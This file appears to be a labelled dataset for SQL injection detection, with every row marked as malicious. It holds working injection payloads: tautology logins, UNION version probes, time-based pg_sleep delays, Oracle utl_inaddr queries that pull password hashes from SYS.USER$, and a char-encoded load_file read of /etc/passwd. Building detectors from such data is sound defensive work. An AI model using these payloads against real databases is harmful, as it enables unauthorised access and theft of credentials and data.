Sentence,Label
""" or pg_sleep  (  __TIME__  )  --",1
create user name identified by pass123 temporary tablespace temp default tablespace users,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,111,116,99,47,112,97,115,115,119,111   )    )     )  ,1,1,1;",1
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1
? or 1  =  1 --,1
 )   or   (  'a'  =  'a,1
admin' or 1  =  1#,1
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1
or 1  =  1 --,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
distinct,1
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1
"admin"" or ""1""  =  ""1""--",1
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1
insert,1
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1
"or 1  =  1 or """"  =  ",1
/**/or/**/1/**/  =  /**/1,1
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1
or 1  =  1/*,1
%27 or 1  =  1,1
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,111,116,99,47,112,97,115, ...",1
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1
or 1 --',1
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1
"admin"" or 1  =  1#",1
